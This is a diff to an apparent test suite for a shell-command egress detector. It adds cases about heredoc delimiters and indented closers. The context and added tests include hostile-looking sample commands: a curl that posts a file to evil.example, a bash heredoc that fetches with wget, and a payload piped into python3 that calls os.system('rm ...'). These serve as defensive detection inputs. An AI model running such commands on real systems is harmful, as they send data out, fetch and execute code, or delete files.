@@ -491,6 +491,16 @@ describe("heredoc bodies do not fabricate egress", () => {
 		expect(outbound("echo $(curl -d @f https://evil.example)")).toBe(false);
 	});
 
+	test("a delimiter named after a network verb is not a fetch", () => {
+		expect(outbound("cat <<ssh\nbody\nssh")).toBe(false);
+	});
+
+	test("an indented closer does not cut a piped payload short", () => {
+		// `  EOF` is body text, so the whole payload reaches the release rule
+		// and its os.system marker keeps the flag.
+		expect(flags("cat x | python3 - <<'EOF'\n  EOF\nos.system('rm /tmp/x')\nEOF")).toContain("| python3");
+	});
+
 	test("a body the command executes still carries its egress", () => {
 		expect(outbound("bash -s <<'EOF'\nwget https://example.com/f\nEOF")).toBe(true);
 	});
